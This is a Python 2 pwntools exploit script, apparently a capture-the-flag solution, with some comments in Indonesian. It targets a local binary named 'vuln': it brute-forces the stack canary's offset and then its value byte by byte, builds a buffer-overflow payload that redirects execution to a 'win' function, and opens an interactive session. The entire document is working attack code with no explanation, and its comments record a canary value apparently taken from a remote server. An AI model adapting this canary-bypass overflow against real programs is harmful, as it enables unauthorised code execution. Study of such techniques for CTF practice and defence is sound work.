from pwn import *
elf = ELF("./vuln")
def _canary():
    offset_canary = 0
    elf = ELF("./vuln")
    for y in range(1,100):
        r = elf.process()
        r.recvuntil("> ")
        r.sendline(str(y))
        p = "A" * y
        r.recvuntil("> ")
        r.sendline(p)
        data = r.recv()
        if "*** Stack Smashing Detected *** : Canary Value Corrupt!" in data:
            offset_canary = y - 1
            r.close()
            break
        else:
            r.close()
    print "[!] offset canary : " , offset_canary
    return offset_canary
    #print '[!] CANARY :' , hex(u32(nilai_canary))

def leak_canary(offset):
    nilai_canary = ""
    for x in range(4):
        for y in range(256):
            r = elf.process()
            #r.recvuntil("> ")
            #r.sendline("100")
            r.sendlineafter("> ", "100")
            payload = "A" * 32 + nilai_canary + chr(y)
            r.recvuntil("> ")
            r.send(payload)
            #r.sendafter("> ", payload)
            print "[!] payload : " , payload
            print "[?] offset canary : " , offset
            print "[?] nilai canary : " , nilai_canary
            response = r.recvline()
            print "[?] response : ", response
            if "Now" in response:
                nilai_canary += chr(y)
                r.close()
                break
            else:
                r.close()
    print "[!] nilai canary : " , hex(u32(nilai_canary))
    return u32(nilai_canary)

def main():
    offset_canary = _canary()  # dapat 32
    canary        = leak_canary(offset_canary) # nilai canary local : 0x43434343 , server = 0x6a774849
    print "[!] canary : " + str(canary)
    r = elf.process()
    p = ''
    p += "A"*32
    #p += p32(0x6a774849)
    p += p32(0x43434343)
    p += "A"*16
    #p += cyclic(100)
    p += p32(elf.symbols['win'])
    r.recvuntil("> ")
    r.sendline("100")
    r.recvuntil("> ")
    r.sendline(p)
    r.interactive()
if __name__ == '__main__':
    main()
